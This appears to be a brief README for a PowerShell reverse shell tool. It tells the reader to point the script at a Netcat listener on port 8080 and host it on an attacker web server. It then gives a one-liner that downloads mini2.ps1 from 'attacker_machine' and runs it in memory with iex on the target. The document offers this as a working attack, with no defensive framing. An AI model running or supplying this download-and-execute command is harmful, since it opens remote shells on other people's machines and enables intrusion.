# Powershell based Reverse Shell

These powershell based scripts are Reverse shell scripts.

Just change the text "SERVER_IP" with your machine IP (the one, on which Netcat is Listening on port 8080)

Upload the script to attacker server using web server.

<b>Run script on target server</b>

##########################


      powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://attacker_machine/mini2.ps1')"

./thanks
